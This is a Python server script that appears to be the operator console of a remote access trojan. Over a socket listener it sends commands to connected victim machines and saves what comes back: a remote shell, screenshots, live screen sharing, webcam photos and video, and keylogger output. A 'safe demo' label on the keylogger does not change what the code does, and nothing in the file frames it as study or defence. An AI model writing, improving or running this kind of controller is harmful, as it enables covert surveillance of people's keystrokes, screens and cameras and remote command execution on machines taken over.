import socket
import os
import threading

HOST = "0.0.0.0"
PORT = 54321
server_running = True

def handle_client(conn, addr):
    global server_running
    print(f"[+] Client connected: {addr}")
    print( r"""
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░████░░░░░░██░░░░░░░░█
█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀░░██░░▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░░░░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░████░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░▄▀░░███░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░████████████░░▄▀░░██░░▄▀░░███
█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░████░░▄▀░░░░░░▄▀░░███
█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░████░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░███░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█████████░░▄▀░░████░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀░░░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░████░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀░░██░░▄▀▄▀░░█
█░░░░░░██░░░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░░░░░░░░░████░░░░░░██░░░░░░░░█
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
""")
    while True:

        print("\n=== Remote Control Menu ===")
        print("1. Shell Access")
        print("2. Screenshot")
        print("3. Screen Share (Live)")
        print("4. Camera Capture")
        print("5. Exit Client")
        print("6. Shutdown Server")
        print("7. Keylogger Capture")
        print("8. Live Camera (Video)")
        print("============================")
        
        choice = input("Select option (1-8): ").strip()
        
        if choice == "1":
            shell_mode(conn)
        elif choice == "2":
            capture_screenshot(conn)
        elif choice == "3":
            screen_share(conn)
        elif choice == "4":
            capture_camera(conn)
        elif choice == "5":
            conn.send(b"exit")
            break
        elif choice == "6":
            print("[*] Shutdown requested: stopping server after this client.")
            server_running = False
            conn.send(b"exit")
            break
        elif choice == "7":
            keylogger_capture(conn)  # Safe demo keylogger
        elif choice == "8":
            camera_stream(conn)
        else:
            print("[-] Invalid option. Try again.")
    
    conn.close()
    print(f"[-] Client {addr} disconnected")

def shell_mode(conn):
    print("[+] Shell mode activated. Type 'back' to return")
    while True:
        cmd = input('SHELL> ').strip()
        if cmd.lower() == 'back':
            break
        if cmd.lower() == 'exit':
            conn.send(b"exit")
            return
        conn.send(cmd.encode())
        try:
            res = conn.recv(4096).decode(errors="replace")
            print(res)
        except:
            print("[-] Failed to receive response")

def capture_screenshot(conn):
    print("[*] Requesting screenshot...")
    conn.send(b"screenshot")
    try:
        size_data = conn.recv(32).decode().strip()
        if size_data.startswith("SIZE"):
            size = int(size_data.split()[1])
            conn.send(b"READY")
            data = b""
            while len(data) < size:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            filename = f"screenshot_{len([f for f in os.listdir('.') if f.startswith('screenshot_')])+1}.png"
            with open(filename, "wb") as f:
                f.write(data)
            print(f"[+] Screenshot saved as {filename}")
        else:
            print(f"[-] Error: {size_data}")
    except Exception as e:
        print(f"[-] Screenshot failed: {e}")

def screen_share(conn):
    print("[*] Starting screen share...")
    conn.send(b"screenshare_start")
    try:
        while True:
            size_data = conn.recv(32).decode().strip()
            if size_data.startswith("FRAME"):
                size = int(size_data.split()[1])
                conn.send(b"READY")
                data = b""
                while len(data) < size:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                with open("live_frame.jpg", "wb") as f:
                    f.write(data)
                print("[*] Frame received. Enter to continue or 'stop' to exit")
                user_input = input()
                if user_input.lower() == 'stop':
                    conn.send(b"stop")
                    break
                else:
                    conn.send(b"next")
            else:
                break
    except Exception as e:
        print(f"[-] Screen share error: {e}")

def capture_camera(conn):
    print("[*] Requesting camera capture...")
    conn.send(b"camera")
    try:
        size_data = conn.recv(32).decode().strip()
        if size_data.startswith("SIZE"):
            size = int(size_data.split()[1])
            conn.send(b"READY")
            data = b""
            while len(data) < size:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            filename = f"camera_{len([f for f in os.listdir('.') if f.startswith('camera_')])+1}.jpg"
            with open(filename, "wb") as f:
                f.write(data)
            print(f"[+] Camera image saved as {filename}")
        else:
            print(f"[-] Error: {size_data}")
    except Exception as e:
        print(f"[-] Camera capture failed: {e}")

def keylogger_capture(conn):
    print("[*] Requesting keylogger data (safe demo)...")
    conn.send(b"keylogger")
    try:
        size_data = conn.recv(32).decode().strip()
        if size_data.startswith("SIZE"):
            size = int(size_data.split()[1])
            conn.send(b"READY")
            data = b""
            while len(data) < size:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            filename = f"keylogger_demo_{len([f for f in os.listdir('.') if f.startswith('keylogger_demo_')])+1}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(data.decode(errors="replace"))
            print(f"[+] Keylogger data saved as {filename}")
        else:
            print(f"[-] Error: {size_data}")
    except Exception as e:
        print(f"[-] Keylogger capture failed: {e}")

def camera_stream(conn):
    print("[*] Starting live camera stream...")
    conn.send(b"camerastream_start")
    frame_count = 0
    try:
        while True:
            header = conn.recv(32).decode().strip()
            if header.startswith("CAMFRAME"):
                size = int(header.split()[1])
                conn.send(b"READY")
                data = b""
                while len(data) < size:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                frame_count += 1
                filename = f"live_cam_{frame_count}.jpg"
                with open(filename, "wb") as f:
                    f.write(data)
                print(f"[*] Frame {frame_count} received. Enter to continue or 'stop' to exit")
                user_input = input()
                if user_input.lower() == "stop":
                    conn.send(b"stop")
                    break
                else:
                    conn.send(b"next")
            else:
                break
    except Exception as e:
        print(f"[-] Camera stream error: {e}")

def main():
    global server_running
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[+] Server listening on {HOST}:{PORT}")
        while server_running:
            conn, addr = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[+] Server shutting down...")
    finally:
        s.close()
        print("[+] Server stopped.")

if __name__ == "__main__":
    main()
